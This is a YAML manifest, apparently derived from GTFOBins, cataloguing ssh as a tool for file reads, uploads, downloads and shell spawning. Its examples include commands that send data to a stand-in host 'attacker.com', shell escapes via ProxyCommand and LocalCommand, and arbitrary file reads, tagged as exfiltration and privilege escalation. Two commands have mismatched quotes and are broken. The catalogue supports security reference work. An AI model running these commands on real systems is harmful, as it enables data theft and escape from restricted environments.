---
id: network-ssh-ssh
namespace: network:ssh:ssh
name: ssh
description: Secure Shell client; can execute remote commands, read/write files, transfer
  data, and spawn shells Can also download files, read arbitrary files, spawn an interactive
  shell, upload files.
author: GTFOBins
version: 1.0.0
capabilities:
- network.transfer.download
- system.file.read
- security.privilege-escalation.shell
- network.transfer.upload
platforms:
- linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
- arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - shell-access
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
- ssh
parameters: []
features:
- file-system
- interactive
- local
- network-intensive
- pipes-stdin
- process-manip
- remote
- requires-root
execution:
  template: ssh
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Download files
  command: ssh user@attacker.com 'cat /path/to/input-file"
- description: Read arbitrary files
  command: ssh -F /path/to/input-file x
- description: Spawn an interactive shell
  command: ssh localhost /bin/sh
- description: Spawn an interactive shell
  command: ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
- description: Spawn an interactive shell
  command: ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
- description: Upload files
  command: echo DATA | ssh user@attacker.com 'cat >/path/to/output-file"
references:
- label: GTFOBins
  url: https://gtfobins.github.io/gtfobins/ssh/
techniques:
- collection
- privilege-escalation
- execution
- exfiltration
install:
- method: apt
  package_name: openssh-client
  commands:
  - apt-get install -y openssh-client
---

# ssh

ssh is a command-line utility. Secure Shell client; can execute remote commands, read/write files, transfer data, and spawn shells Can also download files, read arbitrary files, spawn an interactive shell, upload files.
